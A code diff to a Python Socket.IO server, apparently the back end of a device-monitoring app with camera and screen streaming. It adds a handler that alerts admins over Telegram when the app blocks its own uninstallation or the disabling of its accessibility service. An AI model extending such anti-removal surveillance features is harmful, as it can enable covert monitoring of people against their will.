@@ -2060,6 +2060,52 @@ def _api_camera_frame():
 # ⚡⚡⚡ SOCKET.IO: screen_frame handler (بث الشاشة)
 _screen_streams: dict = {}  # stream_id → {jpeg, timestamp, device_id}
 
+
+# ⚡ V11.2.44: security_event handler — يستلم أحداث الحماية من التطبيق
+@socketio.on("security_event")
+def _sock_security_event(data):
+    """يستلم أحداث الحماية من التطبيق (uninstall_blocked, accessibility_blocked, ...)"""
+    try:
+        dev = dm.get_device_by_sid(request.sid)
+        if not dev:
+            logger.warning(f"[Socket] security_event from unknown SID={request.sid}")
+            return
+
+        event_type = data.get("event", "unknown")
+        timestamp = data.get("timestamp", 0)
+        logger.info(f"🛡️ Security event from #{dev.get('short_id', '?')}: {event_type}")
+
+        if mdm_bot:
+            short_label = _dev_label(dev)
+            from datetime import datetime as _dt
+            now_str = _dt.now().strftime("%H:%M:%S")
+
+            # رسائل مخصصة حسب نوع الحدث
+            if event_type == "uninstall_blocked":
+                msg = (f"🛡️ <b>تم منع محاولة إلغاء التثبيت</b>\n\n"
+                       f"📱 <b>{short_label}</b>\n"
+                       f"🕐 {now_str}\n"
+                       f"✅ التطبيق لا يزال يعمل ويراقب")
+            elif event_type == "accessibility_blocked":
+                msg = (f"🛡️ <b>تم منع تعطيل إمكانية الوصول</b>\n\n"
+                       f"📱 <b>{short_label}</b>\n"
+                       f"🕐 {now_str}\n"
+                       f"✅ الخدمة لا تزال مفعّلة")
+            else:
+                msg = (f"🛡️ <b>حدث حماية</b>\n\n"
+                       f"📱 <b>{short_label}</b>\n"
+                       f"🕐 {now_str}\n"
+                       f"📋 {event_type}")
+
+            for admin_id in Config.ADMIN_IDS:
+                try:
+                    mdm_bot.bot.send_message(admin_id, msg, parse_mode="HTML")
+                except Exception as e:
+                    logger.error(f"❌ Failed to notify admin {admin_id}: {e}")
+    except Exception as e:
+        logger.error(f"❌ security_event error: {e}", exc_info=True)
+
+
 @socketio.on("screen_frame")
 def _sock_screen_frame(data):
     """يستقبل إطارات بث الشاشة من التطبيق"""
